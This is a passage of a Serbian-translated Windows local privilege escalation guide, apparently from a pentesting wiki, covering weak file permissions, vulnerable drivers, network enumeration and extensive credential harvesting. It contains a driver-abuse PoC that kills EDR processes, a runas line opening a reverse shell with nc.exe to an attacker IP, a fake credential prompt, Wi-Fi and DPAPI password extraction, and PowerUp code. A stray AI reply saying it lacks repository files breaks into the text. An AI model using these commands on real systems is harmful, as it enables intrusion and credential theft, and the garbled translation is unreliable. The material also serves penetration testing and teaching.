Windows omogućava korisnicima da navedu akcije koje će biti preduzete ako usluga zakaže. Ova funkcija može biti konfigurisana da pokazuje na binary. Ako je taj binary zamenljiv, privilege escalation može biti moguć. Više detalja možete naći u [službenoj dokumentaciji](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Aplikacije

### Instalirane aplikacije

Proverite **permissions of the binaries** (možda možete prepisati neki od njih i escalate privileges) i **foldere** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Dozvole za pisanje

Proverite da li možete izmeniti neku config file da biste pročitali neku posebnu datoteku ili da li možete izmeniti neki binary koji će biti izvršen pod nalogom Administratora (schedtasks).

Jedan način da pronađete slabe dozvole za foldere/datoteke u sistemu je izvršavanjem:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++ autoloads bilo koji plugin DLL u svojim `plugins` podfolderima. Ako je prisutan writable portable/copy install, ubacivanje malicioznog plugina omogućava automatic code execution unutar `notepad++.exe` pri svakom pokretanju (uključujući iz `DllMain` i plugin callbacks).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Pokretanje pri startu

**Proverite da li možete overwrite-ovati neki registry ili binary koji će biti executed od drugog user-a.**\
**Pročitajte** **sledeću stranicu** da saznate više o interesantnim **autoruns locations to escalate privileges**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drajveri

Potražite moguće **neobične/ranljive drajvere trećih strana**
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Ako driver izlaže arbitrary kernel read/write primitive (uobičajeno u loše dizajniranim IOCTL handlers), možete eskalirati krađom SYSTEM token direktno iz kernel memory. Pogledajte korak‑po‑korak tehniku ovde:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

Za race-condition bugs gde ranjivi poziv otvara attacker-controlled Object Manager path, namerno usporavanje lookup-a (korišćenjem max-length components ili deep directory chains) može produžiti window sa mikrosekundi na desetine mikrosekundi:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Primitivi oštećenja memorije Registry hive

Modern hive vulnerabilities vam omogućavaju da pripremite determinističke layout-e, zloupotrebite writable HKLM/HKU descendants, i konvertujete metadata corruption u kernel paged-pool overflows bez custom driver-a. Saznajte celu lančanu eksploataciju ovde:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

Neki potpisani third‑party drajveri kreiraju svoj device object sa jakim SDDL pomoću IoCreateDeviceSecure, ali zaborave da postave FILE_DEVICE_SECURE_OPEN u DeviceCharacteristics. Bez ovog flag‑a, secure DACL se ne sprovodi kada se device otvori kroz path koji sadrži dodatni component, omogućavajući bilo kojem neprivilegovanom korisniku da pribavi handle koristeći namespace path kao:

- \\.\DeviceName\anything
- \\.\amsdk\anyfile (from a real-world case)

Jednom kada korisnik može da otvori device, privileged IOCTLs koje driver izlaže mogu se zloupotrebiti za LPE i tampering. Primeri mogućnosti viđenih u prirodi:
- Return full-access handles to arbitrary processes (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Unrestricted raw disk read/write (offline tampering, boot-time persistence tricks).
- Terminate arbitrary processes, including Protected Process/Light (PP/PPL), allowing AV/EDR kill from user land via kernel.

Minimalni PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Mitigations for developers
- Uvek postavite FILE_DEVICE_SECURE_OPEN kada kreirate device objekte koji treba da budu ograničeni pomoću DACL.
- Validirajte kontekst pozivaoca za privilegovane operacije. Dodajte PP/PPL provere pre nego što dozvolite terminaciju procesa ili vraćanje handle-a.
- Ograničite IOCTLs (access masks, METHOD_*, input validation) i razmotrite brokered modele umesto direktnih kernel privilegija.

Detection ideas for defenders
- Monitor user-mode opens of suspicious device names (e.g., \\ .\\amsdk*) and specific IOCTL sequences indicative of abuse.
- Enforce Microsoft’s vulnerable driver blocklist (HVCI/WDAC/Smart App Control) and maintain your own allow/deny lists.


## PATH DLL Hijacking

If you have **write permissions inside a folder present on PATH** you could be able to hijack a DLL loaded by a process and **escalate privileges**.

Check permissions of all folders inside PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Za više informacija o tome kako zloupotrebiti ovu proveru:

{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Mreža

### Deljeni resursi
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts fajl

Proverite da li su drugi poznati računari hardcoded u hosts fajlu
```
type C:\Windows\System32\drivers\etc\hosts
```
### Mrežni interfejsi i DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Otvoreni portovi

Proverite da li su **usluge sa ograničenim pristupom** dostupne iz spoljašnjosti
```bash
netstat -ano #Opened ports?
```
### Tabela rutiranja
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP tabela
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Firewall Rules

[**Pogledajte ovu stranicu za komande vezane za Firewall**](../basic-cmd-for-pentesters.md#firewall) **(izlistavanje pravila, kreiranje pravila, isključivanje, isključivanje...)**

Više[ komandi za network enumeration ovde](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binar `bash.exe` se takođe može naći u `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Ako dobijete root user, možete slušati na bilo kom portu (prvi put kada koristite `nc.exe` da slušate na portu, pojaviće se upit putem GUI da li `nc` treba da bude dozvoljen od strane firewall-a).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Da biste lako pokrenuli bash kao root, možete probati `--default-user root`

Možete istražiti `WSL` fajl-sistem u folderu `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Windows Credentials

### Winlogon Credentials
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Upravljač kredencijalima / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault čuva korisničke kredencijale za servere, websites i druge programe za koje **Windows** može **automatski prijaviti korisnike**. Na prvi pogled to može izgledati kao da korisnici mogu da čuvaju svoje Facebook credentials, Twitter credentials, Gmail credentials itd., kako bi se automatski prijavljivali preko browsera. Ali to nije tako.

Windows Vault čuva kredencijale koje Windows može koristiti za automatsko prijavljivanje, što znači da bilo koja **Windows application that needs credentials to access a resource** (server or a website) **može iskoristiti ovaj Credential Manager** & Windows Vault i koristiti sačuvane kredencijale umesto da korisnici stalno unose korisničko ime i lozinku.

Ako aplikacije ne komuniciraju sa Credential Manager-om, ne mislim da je moguće da koriste kredencijale za dati resurs. Dakle, ako vaša aplikacija želi da koristi vault, treba na neki način da **komunicira sa credential manager-om i zatraži kredencijale za taj resurs** iz podrazumevanog storage vault-a.

Koristite `cmdkey` da nabrojite sačuvane kredencijale na mašini.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Zatim možete koristiti `runas` sa opcijom `/savecred` kako biste koristili sačuvane kredencijale. Sledeći primer poziva udaljeni binary preko SMB share-a.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Korišćenje `runas` sa datim skupom credential.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Imajte na umu da mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), ili iz [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

**Data Protection API (DPAPI)** obezbeđuje metod za simetričnu enkripciju podataka, koji se prvenstveno koristi u Windows operativnom sistemu za simetričnu enkripciju asimetričnih privatnih ključeva. Ova enkripcija koristi korisničku ili sistemsku tajnu koja značajno doprinosi entropiji.

**DPAPI omogućava enkripciju ključeva pomoću simetričnog ključa koji se izvodi iz korisničkih tajni za prijavu**. U scenarijima koji uključuju sistemsku enkripciju, koristi tajne domenskog autentifikovanja sistema.

Sifrovani korisnički RSA ključevi, koristeći DPAPI, čuvaju se u direktorijumu %APPDATA%\Microsoft\Protect\{SID}, gde {SID} predstavlja korisnikov [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier). **DPAPI ključ, koji je smešten zajedno sa master ključem koji štiti korisnikove privatne ključeve u istoj datoteci**, obično se sastoji od 64 bajta nasumičnih podataka. (Važno je napomenuti da je pristup ovom direktorijumu ograničen, što sprečava listanje njegovog sadržaja pomoću komande `dir` u CMD, iako se može listati putem PowerShell).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Možete koristiti **mimikatz module** `dpapi::masterkey` sa odgovarajućim argumentima (`/pvk` ili `/rpc`) да га дешифрујете.

**credentials files protected by the master password** се обично налазе у:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Možete koristiti **mimikatz module** `dpapi::cred` sa odgovarajućim `/masterkey` da dešifrujete.  
Možete **izvući mnogo DPAPI** **masterkeys** iz **memorije** pomoću `sekurlsa::dpapi` modula (ako ste root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell kredencijali

**PowerShell credentials** se često koriste za **scripting** i zadatke automatizacije kao način da se enkriptovani podaci za prijavu praktično sačuvaju. Podaci su zaštićeni pomoću **DPAPI**, što obično znači da ih može dešifrovati samo isti korisnik na istom računaru na kojem su kreirani.

Da biste **dešifrovali** PS credentials iz fajla koji ih sadrži, možete uraditi:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wi-Fi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Sačuvane RDP konekcije

Možete ih pronaći na `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
i u `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Nedavno pokrenute komande
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Upravitelj kredencijala za Remote Desktop**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Koristite **Mimikatz** `dpapi::rdg` modul sa odgovarajućim `/masterkey` da **decrypt any .rdg files**\
Možete **extract many DPAPI masterkeys** iz memorije pomoću **Mimikatz** `sekurlsa::dpapi` modula

### Sticky Notes

Ljudi često koriste StickyNotes aplikaciju na Windows radnim stanicama da sačuvaju lozinke i druge informacije, ne shvatajući da je to fajl baze podataka. Ovaj fajl se nalazi na `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` i uvek vredi potražiti i pregledati.

### AppCmd.exe

**Napomena: da biste recover passwords iz AppCmd.exe morate biti Administrator i pokrenuti ga pod High Integrity level.**\
**AppCmd.exe** se nalazi u `%systemroot%\system32\inetsrv\` direktorijumu.\
Ako ovaj fajl postoji, moguće je da su neke **credentials** konfigurisane i mogu biti **recovered**.

Ovaj kod je izdvojen iz [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Proverite da li `C:\Windows\CCM\SCClient.exe` postoji .\
Instaleri se **pokreću sa SYSTEM privileges**, mnogi su ranjivi na **DLL Sideloading (Informacije sa** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Datoteke i Registry (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH ključevi hosta
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH ključevi u registru

SSH privatni ključevi mogu biti sačuvani u registru pod ključem `HKCU\Software\OpenSSH\Agent\Keys`, pa bi trebalo da proverite da li se tamo nalazi nešto interesantno:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Ako pronađete bilo koji unos u tom putu, to je verovatno sačuvan SSH key. Skladišten je šifrovan, ali se može lako dešifrovati korišćenjem [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Više informacija o ovoj tehnici ovde: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Ako `ssh-agent` servis nije pokrenut i želite da se automatski pokreće pri podizanju sistema, pokrenite:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Izgleda da ova tehnika više nije validna. Pokušao sam da kreiram neke ssh keys, dodam ih pomoću `ssh-add` i prijavim se preko ssh na mašinu. Registar HKCU\Software\OpenSSH\Agent\Keys ne postoji i procmon nije identifikovao upotrebu `dpapi.dll` tokom autentifikacije pomoću asimetričnih ključeva.

### Datoteke bez nadzora
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Takođe možete pretražiti ove fajlove koristeći **metasploit**: _post/windows/gather/enum_unattend_

Primer sadržaja:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM rezervne kopije
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Cloud kredencijali
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Potražite fajl pod imenom **SiteList.xml**

### Keširani GPP password

Pre je postojala funkcija koja je omogućavala raspoređivanje prilagođenih lokalnih administrator naloga na grupu mašina putem Group Policy Preferences (GPP). Međutim, ova metoda je imala značajne bezbednosne propuste. Prvo, Group Policy Objects (GPOs), koji su uskladišteni kao XML fajlovi u SYSVOL, mogli su biti pristupljeni od strane bilo kog domain korisnika. Drugo, lozinke unutar ovih GPP-ova, enkriptovane AES256 koristeći javno dokumentovani podrazumevani ključ, mogle su biti dekriptovane od strane bilo kog autentifikovanog korisnika. Ovo je predstavljalo ozbiljan rizik, jer je omogućavalo korisnicima da dobiju povišene privilegije.

Da bi se ublažio ovaj rizik, razvijena je funkcija koja skenira lokalno keširane GPP fajlove koji sadrže polje "cpassword" koje nije prazno. Kada pronađe takav fajl, funkcija dekriptuje lozinku i vraća prilagođeni PowerShell objekat. Ovaj objekat uključuje detalje o GPP-u i lokaciji fajla, pomažući u identifikaciji i otklanjanju ovog bezbednosnog propusta.

Search in `C:\ProgramData\Microsoft\Group Policy\history` or in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (pre Windows Vista)_ for these files:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Za dekriptovanje cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Korišćenje crackmapexec-a za dobijanje lozinki:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web konfiguracija
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Primer web.config fajla sa kredencijalima:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN podaci za prijavu
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Logovi
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Zatražite credentials

Uvek možete **zamoliti korisnika da unese svoje credentials ili čak credentials drugog korisnika** ako mislite da ih možda zna (primetite da je **pitati** klijenta direktno za **credentials** zaista **rizično**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Mogući nazivi fajlova koji sadrže credentials**

Poznati fajlovi koji su nekada sadržavali **passwords** u **clear-text** ili **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
I don't have access to your repository files. Please either:

- Paste the full contents of src/windows-hardening/windows-local-privilege-escalation/README.md here, or
- Provide the list of "proposed files" and their contents you want translated, or
- Give a link or upload the files.

Once you provide the file(s), I will translate the English text to Serbian, preserving all markdown/html syntax, links, paths, tags and code as you requested.
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Kredencijali u RecycleBin

Takođe proverite Bin da biste našli kredencijale u njemu

Da biste **oporavili lozinke** sačuvane od strane više programa, možete koristiti: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Unutar registra

**Drugi mogući ključevi registra sa kredencijalima**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Istorija pregledača

Treba da proverite db fajlove gde su sačuvane lozinke iz **Chrome or Firefox**.\
Takođe proverite istoriju, bookmarks i favourites pregledača — moguće je da su neke **lozinke** tamo sačuvane.

Alati za izvlačenje lozinki iz pregledača:

- Mimikatz: `dpapi::chrome`
